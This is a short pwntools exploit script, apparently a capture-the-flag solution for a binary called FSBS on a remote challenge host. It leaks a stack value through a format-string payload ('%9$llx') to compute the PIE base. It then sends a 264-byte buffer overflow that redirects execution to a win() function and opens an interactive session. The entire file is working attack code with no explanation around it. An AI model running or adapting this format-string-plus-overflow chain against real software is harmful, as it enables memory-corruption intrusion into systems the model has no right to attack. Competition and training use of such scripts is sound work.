from pwn import *
import sys

exe = ELF("./FSBS")
host = "ctf-85ib.balancedcompo.site" 
port = 9994

def exploit(p):
    
    payload = "%9$llx"
    sl(payload)

    # Leak pie_base using FSB
    p.recvuntil('Sending message to:\n')
    leak = int(p.recvline().strip(), 16)
    pie_base = leak - 0xcab
    
    # Call win() using BOF
    win = pie_base + 0xa1a
    padding = "A"*264
    payload = padding + p64(win)
    sl(payload)

    lg('Leak: ' + hex(leak))
    lg('pie_base: ' + hex(pie_base))

    p.interactive()

if __name__ == "__main__":
    context.binary = exe

    if sys.argv[-1] == "remote":
        p = remote(host, port)
    else:
        p = process([exe.path])
        pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    lg = lambda a : log.info(a)

    exploit(p)
